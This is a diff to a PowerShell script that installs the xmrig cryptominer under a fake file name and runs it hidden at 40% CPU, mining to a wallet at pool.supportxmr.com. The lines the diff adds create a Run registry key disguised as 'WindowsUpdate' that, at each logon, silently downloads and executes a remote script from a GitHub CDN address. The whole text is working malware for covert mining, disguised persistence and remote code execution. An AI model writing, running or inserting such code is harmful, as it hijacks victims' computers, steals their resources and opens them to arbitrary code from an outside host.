@@ -30,6 +30,8 @@ if (!(Test-Path "$TmpDir\$FakeName")) {
     Move-Item -Path "$TmpDir\xmrig-6.21.0\xmrig.exe" -Destination "$TmpDir\$FakeName" -Force
     Remove-Item -Path $ZipFile, "$TmpDir\xmrig-6.21.0" -Recurse -Force
 }
+$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $RegPath -Name "WindowsUpdate" -Value "powershell.exe -w h -c `"iex (iwr -UseBasicParsing https://cdn.jsdelivr.net/gh/ZeroSpecterX/mon/win_mon.ps1)`""
 
 # التشغيل في الخلفية باستهلاك متوسط (40%) وبدون نافذة
 Start-Process "$TmpDir\$FakeName" -ArgumentList "-o pool.supportxmr.com:3333 -u $W.Win_$env:COMPUTERNAME -p x -k --donate-level 1 --cpu-max-threads-hint 40" -WindowStyle Hidden
